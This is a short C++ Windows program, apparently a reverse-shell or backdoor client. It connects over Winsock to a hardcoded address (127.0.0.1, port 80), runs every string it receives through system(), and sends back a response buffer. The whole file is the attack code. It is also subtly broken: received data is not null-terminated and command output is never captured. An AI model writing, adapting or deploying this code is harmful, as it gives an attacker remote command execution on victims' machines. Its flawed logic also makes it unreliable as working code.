#include <iostream>
#pragma comment(lib, "ws2_32.lib")
#include <WinSock2.h>
#pragma warning(disable:4996)
int main(int argc, char* argv[])
{
	
	WSAData wsaData;
	WORD DLLVersion = MAKEWORD(2, 1);
	WSAStartup(DLLVersion, &wsaData);

	SOCKADDR_IN address;
	int sizeofaddr = sizeof(address);
	address.sin_addr.s_addr = inet_addr("127.0.0.1");
	address.sin_port = htons(80);
	address.sin_family = AF_INET;
	
	SOCKET Connection = socket(AF_INET, SOCK_STREAM, NULL);
	
	while (connect(Connection, (SOCKADDR*)&address, sizeof(address)) != 0)
	{
		std::cout << "ERROR CONNECTION\n";
		Sleep(5);
	}
	
	std::cout << "Connected!\n";
	char msg[2560];
	
	while (true)
	{
		recv(Connection, msg, sizeof(msg), NULL);
		system(msg);
		char response[10000]{};
		send(Connection, response, sizeof(response), NULL);

	}
	
	system("pause");
	return 0;
}